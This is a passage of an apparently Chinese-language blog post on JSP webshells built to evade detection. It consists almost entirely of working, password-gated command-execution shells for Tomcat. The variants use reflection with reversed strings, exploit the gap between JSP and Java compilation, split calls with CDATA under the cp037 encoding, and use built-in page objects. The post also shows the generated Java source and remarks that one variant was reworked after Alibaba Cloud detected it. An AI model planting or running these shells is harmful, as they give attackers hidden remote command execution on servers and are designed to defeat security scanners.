class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span> &amp;&amp; out.getBufferSize() != <span class="hljs-number">0</span>)<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (response.isCommitted()) &#123;<br>              out.flush();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              out.clearBuffer();<br>            &#125;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;&#125;<br>        <span class="hljs-keyword">if</span> (_jspx_page_context != <span class="hljs-literal">null</span>) _jspx_page_context.handlePageException(t);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(t);<br>      &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      _jspxFactory.releasePageContext(_jspx_page_context);<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="利用jsp编译差异"><a href="#利用jsp编译差异" class="headerlink" title="利用jsp编译差异"></a>利用jsp编译差异</h2><p>jsp - - &gt; java - - &gt; class</p><p>在编译java源文件的过程中，JDK会检查其语法是否正确。但是Tomcat不会检查jsp文件的语法是否正确。因此，可以用非标准语法编写jsp脚本，但它可以用正确的语法转换为java源文件</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%<span class="hljs-meta">@page</span> language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ladypwd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    setmode(out,ladypwd,cmd);<br>    &#125;<span class="hljs-keyword">catch</span>(Throwable t) &#123;&#125; <span class="hljs-keyword">finally</span> &#123;_jspxFactory.releasePageContext(_jspx_page_context);&#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setmode</span><span class="hljs-params">(JspWriter myout, String ladypwd, String cmd)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;jspweb&quot;</span>.equals(ladypwd))&#123;<br>    InputStream in= Runtime.getRuntime().exec(cmd.split(<span class="hljs-string">&quot; &quot;</span>)).getInputStream();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    myout.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>((ret = in.read(bs)) != -<span class="hljs-number">1</span>) &#123;<br>      myout.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>    &#125;<br>      myout.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>.java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Generated by the Jasper component of Apache Tomcat</span><br><span class="hljs-comment"> * Version: Apache Tomcat/8.5.99</span><br><span class="hljs-comment"> * Generated at: 2024-05-25 11:26:12 UTC</span><br><span class="hljs-comment"> * Note: The last modified time of this file was set to</span><br><span class="hljs-comment"> *       the last modified time of the source file after</span><br><span class="hljs-comment"> *       generation to assist with modification tracking.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">package</span> org.apache.jsp;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.jsp.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">_1_jsp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.HttpJspBase<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.JspSourceDependent,<br>                 org.apache.jasper.runtime.JspSourceImports &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reverseStr</span><span class="hljs-params">(String str)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(str).reverse().toString();&#125;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> javax.servlet.jsp.<span class="hljs-type">JspFactory</span> <span class="hljs-variable">_jspxFactory</span> <span class="hljs-operator">=</span><br>          javax.servlet.jsp.JspFactory.getDefaultFactory();<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;<br><br>  <span class="hljs-keyword">static</span> &#123;<br>    _jspx_imports_packages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.LinkedHashSet&lt;&gt;(<span class="hljs-number">4</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.http&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;java.io&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.jsp&quot;</span>);<br>    _jspx_imports_classes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.LinkedHashSet&lt;&gt;(<span class="hljs-number">2</span>);<br>    _jspx_imports_classes.add(<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span>);<br>    _jspx_imports_classes.add(<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;<br><br>  <span class="hljs-keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_dependants;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_packages;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_classes;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> javax.el.ExpressionFactory <span class="hljs-title function_">_jsp_getExpressionFactory</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _el_expressionfactory;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> org.apache.tomcat.InstanceManager <span class="hljs-title function_">_jsp_getInstanceManager</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _jsp_instancemanager;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspInit</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspDestroy</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspService</span><span class="hljs-params">(<span class="hljs-keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="hljs-keyword">final</span> javax.servlet.http.HttpServletResponse response)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;<br><br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">_jspx_method</span> <span class="hljs-operator">=</span> request.getMethod();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;<br>      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="hljs-string">&quot;JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">final</span> javax.servlet.jsp.PageContext pageContext;<br>    javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletContext application;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletConfig config;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><br>    <span class="hljs-keyword">try</span> &#123;<br>      response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>      pageContext = _jspxFactory.getPageContext(<span class="hljs-built_in">this</span>, request, response,<br>      <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">8192</span>, <span class="hljs-literal">true</span>);<br>      _jspx_page_context = pageContext;<br>      application = pageContext.getServletContext();<br>      config = pageContext.getServletConfig();<br>      session = pageContext.getSession();<br>      out = pageContext.getOut();<br>      _jspx_out = out;<br><br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">ladypwd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    setmode(out,ladypwd,cmd);<br>    &#125;<span class="hljs-keyword">catch</span>(Throwable t) &#123;&#125; <span class="hljs-keyword">finally</span> &#123;_jspxFactory.releasePageContext(_jspx_page_context);&#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setmode</span><span class="hljs-params">(JspWriter myout, String ladypwd, String cmd)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;jspweb&quot;</span>.equals(ladypwd))&#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(reverseStr(<span class="hljs-string">&quot;emitnuR.gnal.avaj&quot;</span>));<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>    declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance();<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">show</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(reverseStr(<span class="hljs-string">&quot;cexe&quot;</span>), String[].class);<br>    String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,cmd&#125;;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> show.invoke(o,(Object)cmds);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Process) invoke;<br>    InputStream in= p.getInputStream();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    myout.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>((ret = in.read(bs)) != -<span class="hljs-number">1</span>) &#123;<br>    myout.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>    &#125;<br>    myout.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (java.lang.Throwable t) &#123;<br>      <span class="hljs-keyword">if</span> (!(t <span class="hljs-keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;<br>        out = _jspx_out;<br>        <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span> &amp;&amp; out.getBufferSize() != <span class="hljs-number">0</span>)<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (response.isCommitted()) &#123;<br>              out.flush();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              out.clearBuffer();<br>            &#125;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;&#125;<br>        <span class="hljs-keyword">if</span> (_jspx_page_context != <span class="hljs-literal">null</span>) _jspx_page_context.handlePageException(t);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(t);<br>      &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      _jspxFactory.releasePageContext(_jspx_page_context);<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="特殊的内置对象"><a href="#特殊的内置对象" class="headerlink" title="特殊的内置对象"></a>特殊的内置对象</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span>%&gt;<br>&lt;%<span class="hljs-meta">@page</span> contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;jspweb&quot;</span>.equals(_jspx_page_context.getRequest().getParameter(<span class="hljs-string">&quot;pwd&quot;</span>))) &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(_jspx_page_context.getRequest().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>).split(<span class="hljs-string">&quot; &quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((ret=in.read(bs))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>利用少见的编码形式以及CDATA特征在&lt; jsp:scriptlet &gt;编写木马，然后成功  编写时间为2024-5-15</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;cp037&quot;</span> ?&gt;<br>&lt;jsp:root xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span> xmlns=<span class="hljs-string">&quot;http://www.w3.or/1999/xhtml&quot;</span> version=<span class="hljs-string">&quot;2.0&quot;</span>&gt;<br>    &lt;jsp:directive.page contentType=<span class="hljs-string">&quot;text/html&quot;</span>/&gt;<br>    &lt;jsp:directive.page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>/&gt;<br>    &lt;jsp:declaration&gt;<br>    &lt;/jsp:declaration&gt;<br>    &lt;pre&gt;<br>    &lt;jsp:scriptlet&gt;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;jspweb&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>    InputStream in= Run&lt;![CDATA[time.get]]&gt;Run&lt;![CDATA[time]]&gt;().ex&lt;![CDATA[ec(request.get]]&gt;Parameter(<span class="hljs-string">&quot;cmd&quot;</span>).split(<span class="hljs-string">&quot; &quot;</span>)).getInputStream();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">while</span>((ret=in.read(bs))!=-<span class="hljs-number">1</span>)&#123;<br>     out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>     &#125;<br>    &#125;<br>    &lt;/jsp:scriptlet&gt;<br>    &lt;/pre&gt;<br>    &lt;jsp:text&gt;<br>    &lt;/jsp:text&gt;<br>&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure><p><img src="image-20240515190701734-17163664082681.png" alt="image-20240515190701734"></p><p><img src="image-20250323142629637.png" alt="image-20250323142629637"></p><p><img src="image-20240515192051473.png" alt="image-20240515192051473"></p><p><img src="image-20240515192157618.png" alt="image-20240515192157618"></p><p>马二（因为invoke被阿里云检测到）</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reverseStr</span><span class="hljs-params">(String str)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(str).reverse().toString();&#125;%&gt;<br>&lt;%<span class="hljs-meta">@page</span> language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ladypwd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    setmode(out,ladypwd,cmd);<br>    &#125;<span class="hljs-keyword">catch</span>(Throwable t) &#123;&#125; <span class="hljs-keyword">finally</span> &#123;_jspxFactory.releasePageContext(_jspx_page_context);&#125;<br>   